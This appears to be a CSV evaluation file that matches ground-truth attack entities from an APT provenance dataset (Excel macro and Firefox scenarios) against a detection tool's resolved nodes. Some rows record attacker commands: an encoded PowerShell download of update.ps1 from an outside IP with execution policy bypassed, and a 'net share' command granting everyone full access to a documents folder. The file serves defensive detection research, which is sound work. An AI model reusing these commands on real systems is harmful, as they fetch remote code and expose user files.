attack,gt_uuid,status,gt_type,gt_name,our_type,our_name,our_cmdline,type_match,name_match,mismatch_reason,resolved_uuid
fivedirections_e3_excel_0409,437a617f-bf9c-402b-9ac1-74040e8f6a68,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\mydocs""}",file,C:\Users\admin\Documents\mydocs,,1,1,,437a617f-bf9c-402b-9ac1-74040e8f6a68
fivedirections_e3_excel_0409,40989dd5-c389-4c76-8435-8b6074f19659,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\ProgramData\\\\update.ps1""}",file,\Device\HarddiskVolume2\ProgramData\update.ps1,,1,1,,40989dd5-c389-4c76-8435-8b6074f19659
fivedirections_e3_excel_0409,9ed8a6dd-4421-49ef-952c-95345205919b,direct,process,None powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB,process,powershell.exe,powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUA,1,1,,9ed8a6dd-4421-49ef-952c-95345205919b
fivedirections_e3_excel_0409,c0f74d6f-1cae-496e-b280-7230cf4edce4,direct,file,"{""Device\\\\HarddiskVolume2\\\\ProgramData\\\\update.ps1""}",file,Device\HarddiskVolume2\ProgramData\update.ps1,,1,1,,c0f74d6f-1cae-496e-b280-7230cf4edce4
fivedirections_e3_excel_0409,747beaa2-4e2e-4eb5-9d15-bdab9391b84c,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\taskkill.exe""}",file,\Device\HarddiskVolume2\Windows\System32\taskkill.exe,,1,1,,747beaa2-4e2e-4eb5-9d15-bdab9391b84c
fivedirections_e3_excel_0409,d3fb71d4-6cd5-4d30-8cd7-ef82eeb5b5c8,direct,file,"{""C:\\\\ProgramData\\\\update.ps1""}",file,C:\ProgramData\update.ps1,,1,1,,d3fb71d4-6cd5-4d30-8cd7-ef82eeb5b5c8
fivedirections_e3_excel_0409,8ee116e4-fcfd-4934-8822-f14e8b9c45db,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Document.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\Document.rtf,,1,1,,8ee116e4-fcfd-4934-8822-f14e8b9c45db
fivedirections_e3_excel_0409,4b9a91ff-9531-4338-91f3-2f09168e423f,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\Document.rtf""}",file,C:\Users\admin\Documents\Document.rtf,,1,1,,4b9a91ff-9531-4338-91f3-2f09168e423f
fivedirections_e3_excel_0409,2a9fba61-0097-42e9-b093-ac97ffbf809c,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\KernelBase.dll""}",file,\Device\HarddiskVolume2\Windows\System32\KernelBase.dll,,1,1,,2a9fba61-0097-42e9-b093-ac97ffbf809c
fivedirections_e3_excel_0409,782f5774-7e01-44b8-989e-e2cfa54a0e0d,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\MissleAlert.rtf,,1,1,,782f5774-7e01-44b8-989e-e2cfa54a0e0d
fivedirections_e3_excel_0409,02edfe8d-ac2d-4b93-85f5-4da6a16f32ee,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf""}",file,C:\Users\admin\Documents\MissleAlert.rtf,,1,1,,02edfe8d-ac2d-4b93-85f5-4da6a16f32ee
fivedirections_e3_excel_0409,236258ac-bee3-4888-a2ec-7609ad28731f,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\MissleAlert.rtf,,1,1,,236258ac-bee3-4888-a2ec-7609ad28731f
fivedirections_e3_excel_0409,b8ca5857-4c0f-4e3c-8cda-25f7107199db,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Document.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\Document.rtf,,1,1,,b8ca5857-4c0f-4e3c-8cda-25f7107199db
fivedirections_e3_excel_0409,255e412f-efdc-4a34-aacb-878071c24533,thread→process,process,None None,process,msmpeng.exe,"""C:\ProgramData\Microsoft\Windows Defender\platform\4.12.17007.18022-0\MsMpEng.exe""",1,1,,cf274a26-147a-40e0-959c-bc9638550520
fivedirections_e3_excel_0409,3d0b2b2a-0262-4f64-8f99-6fca9f07b3db,direct,process,None taskkill  8744,process,taskkill.exe,taskkill  8744,1,1,,3d0b2b2a-0262-4f64-8f99-6fca9f07b3db
fivedirections_e3_excel_0409,e9983ea8-08ec-441a-a126-235061ceec80,thread→process,process,None None,process,taskkill.exe,taskkill  8744,1,1,,3d0b2b2a-0262-4f64-8f99-6fca9f07b3db
fivedirections_e3_excel_0409,64c725d4-119f-48d3-a320-edd5262c0a40,thread→process,process,None None,process,msmpeng.exe,"""C:\ProgramData\Microsoft\Windows Defender\platform\4.12.17007.18022-0\MsMpEng.exe""",1,1,,cf274a26-147a-40e0-959c-bc9638550520
fivedirections_e3_excel_0409,3305472c-15ec-4039-bd1e-880d6a616d19,thread→process,process,None None,process,searchprotocolhost.exe,"""C:\WINDOWS\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe258_ Global\UsGthrCtrlFltPipeMssGthrPipe258 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownL",1,1,,5a3b6144-89b6-4d6b-aadf-e9ff0fb54950
fivedirections_e3_excel_0409,ed63bf6b-0726-40af-bdb8-ea67be98b198,thread→process,process,None None,process,cmd.exe,"""cmd.exe""",1,1,,3e1c1557-0411-45d1-82a3-f981a37faf80
fivedirections_e3_excel_0409,440c2e9d-da7b-40c2-9ee6-5393463347b1,direct,process,"None \""C:\\WINDOWS\\system32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe257_ Global\\UsGthrCtrlFltPipeMssGthrPipe257 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data",process,searchprotocolhost.exe,"""C:\WINDOWS\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe257_ Global\UsGthrCtrlFltPipeMssGthrPipe257 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownL",1,0,"gt_exe=\""c:\\windows\\system32\\searchprotocolhost.exe\""",440c2e9d-da7b-40c2-9ee6-5393463347b1
fivedirections_e3_excel_0409,3e1c1557-0411-45d1-82a3-f981a37faf80,direct,process,"None \""cmd.exe\""",process,cmd.exe,"""cmd.exe""",1,0,"gt_exe=\""cmd.exe\",3e1c1557-0411-45d1-82a3-f981a37faf80
fivedirections_e3_excel_0409,2821ce71-3a60-48a3-83a7-a471bb383b4a,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin""}",file,Device\HarddiskVolume2\Users\admin,,1,1,,2821ce71-3a60-48a3-83a7-a471bb383b4a
fivedirections_e3_excel_0409,9d981c5b-6008-463d-853c-4462b6df7dfb,direct,process,None taskkill  /PID 8744 /F,process,taskkill.exe,taskkill  /PID 8744 /F,1,1,,9d981c5b-6008-463d-853c-4462b6df7dfb
fivedirections_e3_excel_0409,62ff1fea-01e1-4528-874f-5f0778288b6e,thread→process,process,None None,process,searchprotocolhost.exe,"""C:\WINDOWS\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe257_ Global\UsGthrCtrlFltPipeMssGthrPipe257 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownL",1,1,,440c2e9d-da7b-40c2-9ee6-5393463347b1
fivedirections_e3_excel_0409,f9d372b6-3686-4da3-8caa-e475b3811b8c,direct,file,"{""C:\\\\Windows\\\\System32\\\\taskkill.exe""}",file,C:\Windows\System32\taskkill.exe,,1,1,,f9d372b6-3686-4da3-8caa-e475b3811b8c
fivedirections_e3_excel_0409,b0ccb7eb-daf0-41e1-9997-4b3478e76798,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin""}",file,\Device\HarddiskVolume2\Users\admin,,1,1,,b0ccb7eb-daf0-41e1-9997-4b3478e76798
fivedirections_e3_excel_0409,55394081-0a7c-4e8e-8c2f-5035f7e370b8,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\WINDOWS\\\\system32\\\\taskkill.exe.Config""}",file,\Device\HarddiskVolume2\WINDOWS\system32\taskkill.exe.Config,,1,1,,55394081-0a7c-4e8e-8c2f-5035f7e370b8
fivedirections_e3_excel_0409,4c1954fb-0316-485d-904b-31344d6649da,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\trains.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\trains.rtf,,1,1,,4c1954fb-0316-485d-904b-31344d6649da
fivedirections_e3_excel_0409,23949574-24d4-4089-854f-8bb934a2934f,direct,file,{taskkill.exe},file,taskkill.exe,,1,1,,23949574-24d4-4089-854f-8bb934a2934f
fivedirections_e3_excel_0409,53b52c96-4521-47cb-92e9-8e5fdf99d29d,direct,file,"{""Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\taskkill.exe""}",file,Device\HarddiskVolume2\Windows\System32\taskkill.exe,,1,1,,53b52c96-4521-47cb-92e9-8e5fdf99d29d
fivedirections_e3_excel_0409,10c50106-71f5-4a17-adc3-4b54787bb8fc,direct,file,"{""Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\en-US\\\\taskkill.exe.mui""}",file,Device\HarddiskVolume2\Windows\System32\en-US\taskkill.exe.mui,,1,1,,10c50106-71f5-4a17-adc3-4b54787bb8fc
fivedirections_e3_excel_0409,3ea7fb5e-0598-4974-9600-0cb44abb35ba,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\trains.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\trains.rtf,,1,1,,3ea7fb5e-0598-4974-9600-0cb44abb35ba
fivedirections_e3_excel_0409,0bfe17f6-9c70-44e6-aae6-3251859f22c7,direct,file,"{""C:\\\\Windows\\\\System32\\\\en-US\\\\taskkill.exe.mui""}",file,C:\Windows\System32\en-US\taskkill.exe.mui,,1,1,,0bfe17f6-9c70-44e6-aae6-3251859f22c7
fivedirections_e3_excel_0409,c3f96165-d4d5-458a-bbbe-84a71e1d444f,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\en-US\\\\taskkill.exe.mui""}",file,\Device\HarddiskVolume2\Windows\System32\en-US\taskkill.exe.mui,,1,1,,c3f96165-d4d5-458a-bbbe-84a71e1d444f
fivedirections_e3_excel_0409,9e8f6990-153b-4a4b-8499-3aaac2008e5b,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\trains.rtf""}",file,C:\Users\admin\Documents\trains.rtf,,1,1,,9e8f6990-153b-4a4b-8499-3aaac2008e5b
fivedirections_e3_excel_0409,dcd013e9-7010-4a51-9fec-8b653c981c7c,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\Excel\\\\BoviaBenefitsOE306586132161491315\\\\BoviaBenefitsOE.xlsm.lnk""}",file,\Device\HarddiskVolume2\Users\admin\AppData\Roaming\Microsoft\Excel\BoviaBenefitsOE306586132161491315\BoviaBenefitsOE.xlsm.lnk,,1,1,,dcd013e9-7010-4a51-9fec-8b653c981c7c
fivedirections_e3_excel_0409,fe198927-f937-4fd2-b6e6-041c3d47017b,direct,process,None net  share mydocs=C:\\Users\\admin\\Documents\\mydocs ,process,net.exe,net  share mydocs=C:\Users\admin\Documents\mydocs ,1,1,,fe198927-f937-4fd2-b6e6-041c3d47017b
fivedirections_e3_excel_0409,15da2c71-74c2-40f1-9d3e-27f2f098c921,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\Excel\\\\BoviaBenefitsOE306586132161491315\\\\BoviaBenefitsOE.xlsm.lnk""}",file,Device\HarddiskVolume2\Users\admin\AppData\Roaming\Microsoft\Excel\BoviaBenefitsOE306586132161491315\BoviaBenefitsOE.xlsm.lnk,,1,1,,15da2c71-74c2-40f1-9d3e-27f2f098c921
fivedirections_e3_excel_0409,58da6981-e3a9-4f28-bfca-c27f66331b20,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf:Zone.Identifier""}",file,\Device\HarddiskVolume2\Users\admin\Documents\MissleAlert.rtf:Zone.Identifier,,1,1,,58da6981-e3a9-4f28-bfca-c27f66331b20
fivedirections_e3_excel_0409,54937d7e-b2f2-4a1e-b631-8e946174793d,direct,process,None C:\\WINDOWS\\system32\\net1  share mydocs=C:\\Users\\admin\\Documents\\mydocs ,process,net1.exe,C:\WINDOWS\system32\net1  share mydocs=C:\Users\admin\Documents\mydocs ,1,0,gt_exe=c:\\windows\\system32\\net1,54937d7e-b2f2-4a1e-b631-8e946174793d
fivedirections_e3_excel_0409,34da6e7f-067d-4fcb-af1f-014f36d3af7b,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\BoviaBenefitsOE.xlsm""}",file,Device\HarddiskVolume2\Users\admin\Documents\BoviaBenefitsOE.xlsm,,1,1,,34da6e7f-067d-4fcb-af1f-014f36d3af7b
fivedirections_e3_excel_0409,845b7c61-4397-4e0d-a23a-a22bde2ca4d7,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\BoviaBenefitsOE.xlsm""}",file,\Device\HarddiskVolume2\Users\admin\Documents\BoviaBenefitsOE.xlsm,,1,1,,845b7c61-4397-4e0d-a23a-a22bde2ca4d7
fivedirections_e3_excel_0409,92161288-8270-4b8e-93b5-e9e81140c04c,direct,process,"None net  share mydocs=C:\\Users\\admin\\Documents\\mydocs /grant:everyone,FULL",process,net.exe,"net  share mydocs=C:\Users\admin\Documents\mydocs /grant:everyone,FULL",1,1,,92161288-8270-4b8e-93b5-e9e81140c04c
fivedirections_e3_excel_0409,410fc7cc-fbea-4f03-866c-b48f9d141521,direct,file,"{""Device\\\\HarddiskVolume2""}",file,Device\HarddiskVolume2,,1,1,,410fc7cc-fbea-4f03-866c-b48f9d141521
fivedirections_e3_excel_0409,19def44f-36d5-43d3-9d1e-eb80ad06c22b,direct,file,"{""C:\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\Excel\\\\BoviaBenefitsOE306586132161491315\\\\BoviaBenefitsOE.xlsm.lnk""}",file,C:\Users\admin\AppData\Roaming\Microsoft\Excel\BoviaBenefitsOE306586132161491315\BoviaBenefitsOE.xlsm.lnk,,1,1,,19def44f-36d5-43d3-9d1e-eb80ad06c22b
fivedirections_e3_excel_0409,91386ee2-f150-4b10-8b18-954a8c04198d,thread→process,process,None None,process,excel.exe,"""C:\Program Files (x86)\Microsoft Office\Office15\EXCEL.EXE"" /dde",1,1,,ef82624e-5d48-4520-8642-0acf0651e5f7
fivedirections_e3_excel_0409,97485b66-8cfa-4448-ba56-8d7f67eba308,direct,process,"None C:\\WINDOWS\\system32\\net1  share mydocs=C:\\Users\\admin\\Documents\\mydocs /grant:everyone,FULL",process,net1.exe,"C:\WINDOWS\system32\net1  share mydocs=C:\Users\admin\Documents\mydocs /grant:everyone,FULL",1,0,gt_exe=c:\\windows\\system32\\net1,97485b66-8cfa-4448-ba56-8d7f67eba308
fivedirections_e3_excel_0409,ef82624e-5d48-4520-8642-0acf0651e5f7,direct,process,"None \""C:\\Program Files (x86)\\Microsoft Office\\Office15\\EXCEL.EXE\"" /dde",process,excel.exe,"""C:\Program Files (x86)\Microsoft Office\Office15\EXCEL.EXE"" /dde",1,0,"gt_exe=\""c:\\program",ef82624e-5d48-4520-8642-0acf0651e5f7
fivedirections_e3_excel_0409,cffdf1ef-1349-428e-a4e3-26460ee8f8f4,thread→process,process,None None,process,svchost.exe,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s SysMain,1,1,,04f5e4ce-b003-4600-9ae5-5e240b7dbb56
fivedirections_e3_excel_0409,a2228fbe-118e-44c1-8d52-0a66d3cc12ac,direct,netflow,128.55.12.67:57619->208.75.117.5:80,netflow,128.55.12.67:57619->208.75.117.5:80,,1,1,,a2228fbe-118e-44c1-8d52-0a66d3cc12ac
fivedirections_e3_excel_0409,6c407dbe-9b5f-443f-bb1c-1dd12faa1c6c,direct,file,"{""Device\\\\DeviceApi""}",file,Device\DeviceApi,,1,1,,6c407dbe-9b5f-443f-bb1c-1dd12faa1c6c
fivedirections_e3_excel_0409,541e7952-4ce8-4ae4-9219-f450d3e6d300,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Desktop\\\\BoviaBenefitsOE.xlsm""}",file,Device\HarddiskVolume2\Users\admin\Desktop\BoviaBenefitsOE.xlsm,,1,1,,541e7952-4ce8-4ae4-9219-f450d3e6d300
fivedirections_e3_excel_0409,214db50b-fc64-492e-9246-aca531eb97e2,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Desktop\\\\BoviaBenefitsOE.xlsm:Zone.Identifier""}",file,Device\HarddiskVolume2\Users\admin\Desktop\BoviaBenefitsOE.xlsm:Zone.Identifier,,1,1,,214db50b-fc64-492e-9246-aca531eb97e2
fivedirections_e3_excel_0409,49dc2715-ec0f-46a7-8a39-9e6061204ac4,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Desktop\\\\BoviaBenefitsOE.xlsm""}",file,\Device\HarddiskVolume2\Users\admin\Desktop\BoviaBenefitsOE.xlsm,,1,1,,49dc2715-ec0f-46a7-8a39-9e6061204ac4
fivedirections_e3_firefox_0411,31fddee5-045e-411d-9f03-88e6f23af3fd,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\lwabeat\\\\logs\\\\lwabeat""}",file,\Device\HarddiskVolume2\lwabeat\logs\lwabeat,,1,1,,31fddee5-045e-411d-9f03-88e6f23af3fd
fivedirections_e3_firefox_0411,61abbb5b-0b8d-4e68-afae-12ced5e10c83,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\trains.docx""}",file,\Device\HarddiskVolume2\Users\admin\Documents\trains.docx,,1,1,,61abbb5b-0b8d-4e68-afae-12ced5e10c83
fivedirections_e3_firefox_0411,64814a6f-a574-4ae0-a1b0-60a629744013,direct,netflow,128.55.12.67:57909->156.78.147.114:80,netflow,128.55.12.67:57909->156.78.147.114:80,,1,1,,64814a6f-a574-4ae0-a1b0-60a629744013
fivedirections_e3_firefox_0411,65c86f90-8007-4529-a0cf-09babc8a897f,direct,netflow,128.55.12.67:57910->16.54.116.146:80,netflow,128.55.12.67:57910->16.54.116.146:80,,1,1,,65c86f90-8007-4529-a0cf-09babc8a897f
fivedirections_e3_firefox_0411,40b43d4c-10a3-4228-82e2-dc1f3532b4c3,thread→process,process,None None,process,msmpeng.exe,"""C:\ProgramData\Microsoft\Windows Defender\platform\4.12.17007.18022-0\MsMpEng.exe""",1,1,,cf274a26-147a-40e0-959c-bc9638550520
fivedirections_e3_firefox_0411,3c6f1977-09c7-4cea-b3a8-763aa7c7ad8e,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Covert.xlsx""}",file,\Device\HarddiskVolume2\Users\admin\Documents\Covert.xlsx,,1,1,,3c6f1977-09c7-4cea-b3a8-763aa7c7ad8e
fivedirections_e3_firefox_0411,b64eac5d-665f-4382-87e7-f370bc9bc24c,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\Covert.xlsx""}",file,Device\HarddiskVolume2\Users\admin\Documents\Covert.xlsx,,1,1,,b64eac5d-665f-4382-87e7-f370bc9bc24c
fivedirections_e3_firefox_0411,9f0085db-f398-4548-8dc9-a5310c1cf680,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,3b06be86-685f-4457-a165-a18730a575bc,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\WINDOWS\\\\System32\\\\drivers\\\\etc\\\\lmhosts""}",file,\Device\HarddiskVolume2\WINDOWS\System32\drivers\etc\lmhosts,,1,1,,3b06be86-685f-4457-a165-a18730a575bc
fivedirections_e3_firefox_0411,4eaad8da-6386-42fb-87c0-713ef425e8fe,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,49712b95-e89d-426b-a5a3-37e86a4d628a,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,0c0d443b-0354-481b-8bc1-f8cad8766630,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\Covert.xlsx""}",file,C:\Users\admin\Documents\Covert.xlsx,,1,1,,0c0d443b-0354-481b-8bc1-f8cad8766630
fivedirections_e3_firefox_0411,bc2c98d3-9699-485c-981a-eefc556c8c7f,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,2646324d-6896-4e51-8019-ff268d587399,thread→process,process,None None,process,firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" ",1,1,,8369e7bb-1cb8-4248-bb56-eeb748f1e10f
fivedirections_e3_firefox_0411,1fddb51b-ebdc-4083-9f0c-62016907fe54,direct,file,"{""C:\\\\Users\\\\admin\\\\Documents\\\\locomotives.rtf""}",file,C:\Users\admin\Documents\locomotives.rtf,,1,1,,1fddb51b-ebdc-4083-9f0c-62016907fe54
fivedirections_e3_firefox_0411,1c415180-6ad2-4c57-8711-a6d6877e7577,direct,file,"{""\\\\Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\locomotives.rtf""}",file,\Device\HarddiskVolume2\Users\admin\Documents\locomotives.rtf,,1,1,,1c415180-6ad2-4c57-8711-a6d6877e7577
fivedirections_e3_firefox_0411,d85ad5cb-3af4-4c34-80e1-57ae0bafad66,direct,file,"{""Device\\\\HarddiskVolume2\\\\Users\\\\admin\\\\Documents\\\\locomotives.rtf""}",file,Device\HarddiskVolume2\Users\admin\Documents\locomotives.rtf,,1,1,,d85ad5cb-3af4-4c34-80e1-57ae0bafad66
fivedirections_e3_firefox_0411,c893d828-c202-4d12-97dd-53debed478c3,thread→process,process,None None,process,system,,1,1,,c8f4cb99-30c9-4e5e-ab7d-4d86645c32a4
fivedirections_e3_firefox_0411,e8405db2-665e-463f-886c-ef9419b3c5b8,direct,file,{NULL},file,None,,1,0,path_diff,e8405db2-665e-463f-886c-ef9419b3c5b8
